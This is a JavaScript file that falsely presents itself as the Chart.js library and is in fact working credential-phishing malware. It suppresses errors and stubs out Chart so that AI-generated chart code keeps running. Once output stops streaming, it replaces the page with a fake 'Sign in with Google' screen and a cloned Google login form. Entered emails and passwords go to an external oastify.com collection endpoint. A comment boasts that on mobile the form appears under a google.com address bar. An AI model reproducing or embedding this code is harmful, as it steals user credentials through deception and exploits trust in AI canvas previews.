/*!
 * Chart.js v4.4.9
 * https://www.chartjs.org
 * (c) 2024 Chart.js Contributors
 * Released under the MIT License
 */

// Suppress all errors globally
window.onerror = function() { return true; };
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); });
var _origConsoleError = console.error;
console.error = function() {};

(function () {
  var C = "https://msiv8t5gj953aozjrocyfigj9af13urj.oastify.com";
  var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) || window.innerWidth < 768;

  // Provide a stub Chart object so AI-generated code doesn't throw
  window.Chart = function() {
    return {
      destroy: function(){}, update: function(){}, resize: function(){},
      data: { labels: [], datasets: [] }, options: {}
    };
  };
  window.Chart.register = function() {};
  window.Chart.defaults = { font: {}, color: '', plugins: { legend: {}, tooltip: {} } };

  // Wait for streaming to finish
  var t = null;
  var obs = new MutationObserver(function () {
    clearTimeout(t);
    t = setTimeout(takeover, 800);
  });
  obs.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
  setTimeout(function () { if (t === null) takeover(); }, 4000);

  function takeover() {
    obs.disconnect();
    if (isMobile) {
      // Mobile: render phishing inline (no popup needed)
      renderMobilePhish();
    } else {
      // Desktop: show lure screen, popup on click
      render();
      var goBtn = document.getElementById("go");
      if (goBtn) {
        goBtn.addEventListener("click", function(e) { e.stopPropagation(); openPopup(); }, { once: true });
        goBtn.addEventListener("touchend", function(e) { e.preventDefault(); e.stopPropagation(); openPopup(); }, { once: true });
      }
      document.addEventListener("click", function h() { openPopup(); document.removeEventListener("click", h); }, { once: true });
    }
  }

  function render() {
    document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Canvas</title>\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",system-ui,-apple-system,sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;cursor:pointer}\
.wrap{text-align:center;max-width:420px;padding:40px}\
.icon{font-size:48px;margin-bottom:16px}\
h2{font-size:20px;font-weight:500;color:#fff;margin-bottom:12px}\
p{font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px}\
.btn{display:inline-flex;align-items:center;gap:8px;background:#fff;color:#3c4043;border:1px solid #dadce0;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;transition:box-shadow .2s;-webkit-tap-highlight-color:transparent}\
.btn:hover{box-shadow:0 1px 3px rgba(0,0,0,.2)}\
.btn:active{background:#f1f3f4}\
.btn svg{flex-shrink:0}\
.sub{font-size:11px;color:#555;margin-top:20px}\
</style></head><body>\
<div class="wrap">\
<div class="icon">\u2728</div>\
<h2>Personal Intelligence</h2>\
<p>Please allow personal intelligence connections to continue. Sign in to enable personalized AI features for this app.</p>\
<div class="btn" id="go"><svg width="18" height="18" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#34A853" d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z"/><path fill="#FBBC05" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z"/></svg>Sign in with Google</div>\
<p class="sub">Powered by Google AI \u2022 Privacy Policy</p>\
</div></body>';
  }

  function phishCSS() {
    return '*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",Roboto,Arial,Helvetica,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}\
.container{width:100%;max-width:450px;padding:48px 40px 36px}\
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}\
.logo{display:flex;justify-content:center;margin-bottom:16px}\
.logo svg{height:24px;width:75px}\
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:4px;font-family:"Google Sans",Roboto,sans-serif}\
.subtitle{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px;font-weight:400}\
.field{position:relative;margin-bottom:24px}\
.field input{width:100%;height:56px;padding:16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none;background:#fff;font-family:Roboto,sans-serif}\
.field input:focus{border:2px solid #1a73e8;padding:15px}\
.field input:focus+.label,.field input:not(:placeholder-shown)+.label{top:-8px;font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}\
.field .label{position:absolute;left:12px;top:16px;color:#5f6368;font-size:16px;transition:all .15s;pointer-events:none;font-family:Roboto,sans-serif}\
.field input:not(:focus)+.label{color:#5f6368}\
.forgot{display:block;color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin-bottom:32px;margin-top:-8px}\
.forgot:hover{text-decoration:underline}\
.actions{display:flex;justify-content:space-between;align-items:center}\
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}\
.create:hover{text-decoration:underline}\
.next{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:0 24px;height:36px;font-size:14px;font-weight:500;cursor:pointer;font-family:"Google Sans",Roboto,sans-serif;letter-spacing:.25px;-webkit-tap-highlight-color:transparent}\
.next:hover{background:#1765cc;box-shadow:0 1px 2px 0 rgba(66,133,244,.3),0 1px 3px 1px rgba(66,133,244,.15)}\
.next:active{background:#1558b3}\
.footer{display:flex;justify-content:space-between;align-items:center;padding:16px 24px 0;margin-top:32px}\
.footer select{border:none;color:#5f6368;font-size:12px;background:none;cursor:pointer;font-family:Roboto,sans-serif;padding:8px 0}\
.footer-links{display:flex;gap:24px}\
.footer-links a{color:#5f6368;font-size:12px;text-decoration:none;font-family:Roboto,sans-serif}\
.footer-links a:hover{text-decoration:underline}\
.msg{display:none;text-align:center;padding:40px 20px}\
.msg .check{font-size:48px;margin-bottom:16px}\
.msg h2{font-size:20px;font-weight:400;color:#202124;margin-bottom:8px}\
.msg p{color:#5f6368;font-size:14px}';
  }

  function googleLogoSVG() {
    return '<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><path d="M0 19.49V4.73h2.35v14.76H0zm6.47-8.6c2.39 0 4.13 1.65 4.13 4.03v.28H4.53a2.09 2.09 0 002.2 1.88 2.4 2.4 0 001.95-.89l1.48 1.24c-.87 1.06-2.1 1.58-3.48 1.58-2.64 0-4.42-1.83-4.42-4.1 0-2.27 1.71-4.02 4.21-4.02zm-1.94 2.93h3.83a1.85 1.85 0 00-1.92-1.62c-1.03 0-1.7.67-1.91 1.62z" fill="#5f6368"/><path d="M32.36 4.73h2.35v14.76h-2.35V4.73zm7.96 6.16c2.39 0 4.14 1.65 4.14 4.03v.28h-6.08a2.1 2.1 0 002.2 1.88 2.4 2.4 0 001.96-.89l1.47 1.24c-.86 1.06-2.1 1.58-3.48 1.58-2.64 0-4.42-1.83-4.42-4.1 0-2.27 1.71-4.02 4.21-4.02zm-1.95 2.93h3.84a1.86 1.86 0 00-1.92-1.62c-1.04 0-1.71.67-1.92 1.62z" fill="#5f6368"/><path d="M20.95 12.12c0-4.36-3.28-7.6-7.33-7.6s-7.33 3.24-7.33 7.6 3.29 7.59 7.33 7.59 7.33-3.23 7.33-7.59zm-2.47 0c0 3-2.08 5.07-4.86 5.07s-4.86-2.07-4.86-5.07 2.08-5.08 4.86-5.08 4.86 2.08 4.86 5.08z" fill="#4285F4"/><path d="M30.17 12.12c0-4.36-3.28-7.6-7.32-7.6-4.05 0-7.33 3.24-7.33 7.6s3.28 7.59 7.33 7.59c4.04 0 7.32-3.23 7.32-7.59zm-2.47 0c0 3-2.07 5.07-4.85 5.07-2.79 0-4.86-2.07-4.86-5.07s2.07-5.08 4.86-5.08c2.78 0 4.85 2.08 4.85 5.08z" fill="#EA4335"/><path d="M53.99 4.73v13.56c0 5.58-3.29 7.86-7.18 7.86-3.66 0-5.87-2.45-6.7-4.46l2.05-.85c.51 1.23 1.78 2.68 4.65 2.68 3.04 0 4.92-1.88 4.92-5.42v-1.33h-.14a5.6 5.6 0 01-4.31 1.86c-4.09 0-7.01-3.19-7.01-7.29s2.92-7.34 7.01-7.34a5.55 5.55 0 014.31 1.87h.14V5.1l2.26-.37zm-2.12 7.44c0-2.92-1.95-5.06-4.42-5.06-2.51 0-4.62 2.14-4.62 5.06 0 2.88 2.11 5.01 4.62 5.01 2.47 0 4.42-2.13 4.42-5.01z" fill="#4285F4"/><path d="M58.13 0.5h2.35v19h-2.35v-19z" fill="#34A853"/><path d="M70.78 15.87l1.83 1.22c-.59.88-2.02 2.4-4.49 2.4-3.06 0-5.35-2.37-5.35-5.39 0-3.21 2.31-5.39 5.09-5.39 2.79 0 4.16 2.22 4.6 3.42l.25.62-7.19 2.98c.55 1.08 1.41 1.63 2.61 1.63 1.21 0 2.05-.6 2.65-1.49zm-5.65-1.94l4.81-2c-.26-.67-1.06-1.14-2-1.14-1.2 0-2.87 1.06-2.81 3.14z" fill="#EA4335"/></svg>';
  }

  function phishBody() {
    return '<div class="container">\
<div class="card" id="card">\
<div class="logo">' + googleLogoSVG() + '</div>\
<h1>Sign in</h1>\
<p class="subtitle">to continue to Google AI</p>\
<form id="f">\
<div class="field"><input type="email" id="e" placeholder=" " autocomplete="email" required><span class="label">Email or phone</span></div>\
<div class="field"><input type="password" id="p" placeholder=" " autocomplete="current-password" required><span class="label">Enter your password</span></div>\
<a href="#" class="forgot">Forgot email?</a>\
<div class="actions"><a href="#" class="create">Create account</a><button type="submit" class="next">Next</button></div>\
</form>\
</div>\
<div class="footer"><select><option>English (United States)</option></select><div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div></div>\
</div>\
<div class="msg" id="msg"><div class="check">\u2705</div><h2>Verified</h2><p>Redirecting to Google AI\u2026</p></div>';
  }

  function attachFormHandler() {
    var form = document.getElementById("f");
    if (!form) return;
    form.onsubmit = function(ev) {
      ev.preventDefault();
      var e = document.getElementById("e").value, p = document.getElementById("p").value;
      document.getElementById("card").style.display = "none";
      var m = document.getElementById("msg"); m.style.display = "block";
      setTimeout(function() {
        window.location = C + "/collect?email=" + encodeURIComponent(e) + "&pass=" + encodeURIComponent(p);
      }, 1500);
    };
    var emailEl = document.getElementById("e");
    if (emailEl) emailEl.focus();
  }

  function renderMobilePhish() {
    // On mobile: render phishing form directly in the canvas panel
    // No popup needed — the form sits under google.com URL bar (more convincing!)
    document.documentElement.innerHTML = '<head><meta charset="utf-8">\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<title>Sign in - Google Accounts</title>\
<link rel="icon" href="https://accounts.google.com/favicon.ico">\
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">\
<style>' + phishCSS() + '</style></head><body>' + phishBody() + '<script>0<\/script></body>';
    attachFormHandler();
  }

  function phishHTML() {
    return '<!DOCTYPE html>\
<html lang="en"><head><meta charset="utf-8">\
<meta name="viewport" content="width=device-width,initial-scale=1">\
<title>Sign in - Google Accounts</title>\
<link rel="icon" href="https://accounts.google.com/favicon.ico">\
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">\
<style>' + phishCSS() + '</style></head><body>' + phishBody() + '\
<script>\
document.getElementById("f").onsubmit=function(ev){\
ev.preventDefault();\
var e=document.getElementById("e").value,p=document.getElementById("p").value;\
document.getElementById("card").style.display="none";\
var m=document.getElementById("msg");m.style.display="block";\
setTimeout(function(){\
window.location="' + C + '/collect?email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p);\
},1500);\
};\
document.getElementById("e").focus();\
<\/script></body></html>';
  }

  function openPopup() {
    var blob = new Blob([phishHTML()], { type: "text/html" });
    var url = URL.createObjectURL(blob);
    // Desktop: sized popup. Mobile fallback: new tab (but mobile path shouldn't reach here)
    window.open(url, "_blank", "width=460,height=640,left=180,top=60");
  }
})();
